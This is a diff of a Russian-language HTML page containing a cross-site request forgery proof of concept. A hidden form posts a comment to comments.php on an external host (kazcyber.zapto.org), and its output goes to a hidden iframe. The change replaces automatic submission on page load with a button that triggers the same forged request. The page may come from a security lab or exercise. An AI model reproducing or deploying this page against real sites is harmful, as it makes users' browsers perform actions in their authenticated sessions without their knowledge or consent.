@@ -18,22 +18,30 @@
       font-size: 18px;
       color: #333;
     }
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      margin-top: 20px;
+      cursor: pointer;
+    }
   </style>
 </head>
 <body>
-  <h1>🚨 CSRF Атака активирована</h1>
-  <p class="info">Комментарий будет отправлен без ведома пользователя</p>
+  <h1>🚨 CSRF Атака готова</h1>
+  <p class="info">Нажмите кнопку — комментарий отправится от имени пользователя</p>
 
-  <!-- Скрытая форма, отправляющая комментарий -->
+  <!-- Скрытая форма для атаки -->
   <iframe name="csrfFrame" style="display:none;"></iframe>
   <form id="csrfForm" action="https://kazcyber.zapto.org/comments.php" method="POST" target="csrfFrame">
-    <input type="hidden" name="comment" value="💣 CSRF: комментарий отправлен без csrf_token">
+    <input type="hidden" name="comment" value="💣 CSRF: комментарий отправлен через кнопку">
   </form>
 
+  <button onclick="sendCSRF()">🚀 Отправить комментарий</button>
+
   <script>
-    if (!sessionStorage.getItem('csrf_sent')) {
+    function sendCSRF() {
       document.getElementById("csrfForm").submit();
-      sessionStorage.setItem('csrf_sent', '1');
+      alert("✅ Запрос отправлен. Если сессия активна — комментарий добавлен.");
     }
   </script>
 </body>
